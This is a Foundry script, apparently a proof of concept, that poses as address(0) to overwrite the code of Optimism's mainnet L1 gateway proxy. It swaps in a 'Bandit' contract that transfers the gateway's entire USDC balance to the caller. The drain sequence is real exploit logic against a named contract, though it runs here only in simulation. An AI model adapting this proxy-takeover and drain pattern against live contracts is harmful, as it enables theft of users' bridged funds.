// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import { console } from "forge-std/console.sol";
import { Script } from "forge-std/Script.sol";

interface L1ChugSplashProxy {
    function getImplementation() external returns (address);
    function getOwner() external returns (address);
    function setCode(bytes memory _code) external;
    function setOwner(address _owner) external;
    function setStorage(bytes32 _key, bytes32 _value) external;
}

interface ERC20 {
    function balanceOf(address) view external returns (uint256);
    function transfer(address _to, uint256 _value) external;
}

contract Bandit {
    function transfer(address token, address target) public {
        uint256 balance = ERC20(token).balanceOf(address(this));
        ERC20(token).transfer(target, balance);
    }
}

// Being able to set msg.sender to `address(0)` is very bad.
contract AddressZero is Script {
    address optimismGateway =
        address(0x99C9fc46f92E8a1c0deC1b1747d010903E884bE1);
    ERC20 usdc = ERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);

    function run() external {
        console.log("Mainnet gateway", optimismGateway);
        console.log("My balance:", usdc.balanceOf(address(this)));

        uint256 balance = usdc.balanceOf(optimismGateway);
        console.log("Gateway balance:", balance);

        vm.startPrank(address(0));
        L1ChugSplashProxy(optimismGateway).setCode(
            address(new Bandit()).code
        );
        vm.stopPrank();

        console.log("Transfering...");
        Bandit(optimismGateway).transfer(address(usdc), address(this));
        console.log("My balance after:", usdc.balanceOf(address(this)));
        console.log("Gateway balance after:", usdc.balanceOf(address(optimismGateway)));
    }
}
